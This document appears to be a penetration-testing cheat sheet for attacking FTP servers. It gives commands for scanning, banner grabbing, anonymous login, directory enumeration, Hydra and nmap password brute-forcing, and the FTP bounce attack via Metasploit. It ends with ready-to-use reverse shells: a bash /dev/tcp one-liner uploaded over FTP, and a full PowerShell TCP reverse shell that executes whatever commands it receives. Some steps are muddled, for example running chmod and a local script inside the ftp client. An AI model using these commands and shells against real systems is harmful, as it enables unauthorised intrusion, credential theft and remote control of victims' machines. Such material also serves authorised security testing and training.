## File Transfer Protocol 

### Discovery
```
nmap -p 21 [IP]
nmap -p 21 --script=ftp-anon,ftp-bounce,ftp-syst,ftp-brute [IP]
```

### Banner Grabbing
```
echo -e "QUIT" | nc -nv <target> 21
```

### Connect using FTP command
```
ftp <target-ip> <target-port>
ftp anonymouas@[IP]

# Downloading a file
ftp> get file.txt

# Uploading a file if writable
ftp> put malicious_script.sh

# Check for writeable directory
echo "PUT test.txt" | nc <target> 21
```

### 

### Enumerate Default and Common Directories
```
gobuster dir -u ftp://<target-ip> -w <wordlist-path>
```


### Bruteforcing Creds

#### Hydra

```
hydra -l admin -P passwords.txt ftp://<target>
hydra [-L users.txt or -l user_name] [-P pass.txt or -p password] -f [-S port] ftp://X.X.X.X
```

#### nmap

```
nmap -p 21 --script ftp-brute X.X.X.X
```

### FTP Bounce Attack

#### nmap
```
nmap -p 21 --script ftp-bounce <target>
```

#### Metasploit
```
use auxiliary/scanner/ftp/ftp_bounce
set RHOSTS <FTP_server>
set RPORT <FTP_port>
run
```

### Upload Reverse Shell

#### Linux Reverse Shell
```
echo "bash -i >& /dev/tcp/<attacker-IP>/4444 0>&1" > shell.sh
ftp> put shell.sh
ftp> chmod +x shell.sh
ftp> !nc -lvnp 4444
ftp> !./shell.sh
```

#### Windows Reverse Shell (PowerShell)
```
$client = New-Object System.Net.Sockets.TCPClient("<attacker-IP>",4444);
$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()};
$client.Close()
```
